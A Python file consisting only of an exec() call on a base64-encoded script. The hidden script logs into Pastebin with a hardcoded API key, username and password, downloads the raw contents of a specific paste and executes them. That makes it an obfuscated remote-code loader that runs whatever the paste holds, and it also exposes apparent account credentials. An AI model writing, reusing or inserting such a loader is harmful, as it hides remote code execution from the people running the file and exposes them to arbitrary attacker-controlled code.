import base64

exec(base64.b64decode(b'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KDQojIEF1dGhvcjogcml6Lml0DQoNCmltcG9ydCB1cmxsaWIucmVxdWVzdA0KaW1wb3J0IHVybGxpYi5wYXJzZQ0KDQoNCmNsYXNzIHBhc3RlX2l0KCk6DQogICAgIyBDbGFzcyBWYXJpYWJsZXMNCg0KICAgICMgUGFzdGViaW4gQVBJIEtleQ0KICAgIGFwaV9kZXZfa2V5ID0gJzlhdnYxWmNWcGlkX2xRblp0WlYydG1VNnpURV9LNlBEJw0KICAgICMgUGFzdGViaW4gVXNlcm5hbWUNCiAgICB1c2VybmFtZSA9ICdyaXotaXQnDQogICAgIyBQYXN0ZWJpbiBQYXNzd29yZA0KICAgIHBhc3N3b3JkID0gJ0dObjlUNk14ajQ0dGF1QCcNCiAgICAjIE1heCByZXN1bHRzDQogICAgYXBpX3Jlc3VsdHNfbGltaXQgPSAyNSAgIyBkZWZhdWx0PTUwLCBtaW49MSwgbWF4PTEwMDANCg0KICAgIGRlZiB1c2VyX2tleShzZWxmKToNCiAgICAgICAgIyBjcmVhdGUgdXNlciBrZXkNCiAgICAgICAgdXNlcl9rZXlfZGF0YSA9IHsnYXBpX2Rldl9rZXknOiBzZWxmLmFwaV9kZXZfa2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICdhcGlfdXNlcl9uYW1lJzogc2VsZi51c2VybmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAnYXBpX3VzZXJfcGFzc3dvcmQnOiBzZWxmLnBhc3N3b3JkfQ0KICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX2xvZ2luLnBocCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsbGliLnBhcnNlLnVybGVuY29kZSh1c2VyX2tleV9kYXRhKS5lbmNvZGUoJ3V0Zi04JyksIHRpbWVvdXQ9NykNCiAgICAgICAgcmV0dXJuIHJlcS5yZWFkKCkuZGVjb2RlKCkNCg0KICAgIGRlZiBzaG93X2FwaXVzZXJfcGFzdGUoc2VsZiwgcGFzdGVfa2V5KToNCiAgICAgICAgIyBQcmludCBSYXcgcGFzdGUgY3JlYXRlZCBieSBhcGlfdXNlcg0KICAgICAgICBhcGlfb3B0aW9uID0gJ3Nob3dfcGFzdGUnDQogICAgICAgIGFwaV9wYXN0ZV9rZXkgPSBwYXN0ZV9rZXkNCiAgICAgICAgZGF0YSA9IHsnYXBpX2Rldl9rZXknOiBzZWxmLmFwaV9kZXZfa2V5LA0KICAgICAgICAgICAgICAgICdhcGlfdXNlcl9rZXknOiBzZWxmLnVzZXJfa2V5KCksDQogICAgICAgICAgICAgICAgJ2FwaV9vcHRpb24nOiBhcGlfb3B0aW9uLA0KICAgICAgICAgICAgICAgICdhcGlfcGFzdGVfa2V5JzogYXBpX3Bhc3RlX2tleX0NCiAgICAgICAgcmVxID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9yYXcucGhwJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmxsaWIucGFyc2UudXJsZW5jb2RlKGRhdGEpLmVuY29kZSgndXRmLTgnKSwgdGltZW91dD03KQ0KICAgICAgICByZXR1cm4gcmVxLnJlYWQoKS5kZWNvZGUoKQ0KDQogICAgZGVmIGxpc3RfdHJlbmRpbmcoc2VsZik6DQogICAgICAgICMgbGlzdCBUcmVuZGluZyBQYXN0ZXMsIG1heCBvZiAxOCByZXN1bHRzIGFsbG93ZWQ6DQogICAgICAgIGFwaV9vcHRpb24gPSAndHJlbmRzJw0KICAgICAgICBkYXRhID0geydhcGlfZGV2X2tleSc6IHNlbGYuYXBpX2Rldl9rZXksDQogICAgICAgICAgICAgICAgJ2FwaV9vcHRpb24nOiBhcGlfb3B0aW9ufQ0KICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX3Bvc3QucGhwJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmxsaWIucGFyc2UudXJsZW5jb2RlKGRhdGEpLmVuY29kZSgndXRmLTgnKSwgdGltZW91dD03KQ0KICAgICAgICByZXR1cm4gcmVxLnJlYWQoKQ0KDQoNCnRyeToNCiAgICBwYXN0ZSA9IHBhc3RlX2l0KCkNCiAgICBleGVjKHBhc3RlLnNob3dfYXBpdXNlcl9wYXN0ZSgnU2pWVmdQMDEnKSkNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludCgiWyFdIEFQSSBFcnJvcjoiLCBlKQ0K'))
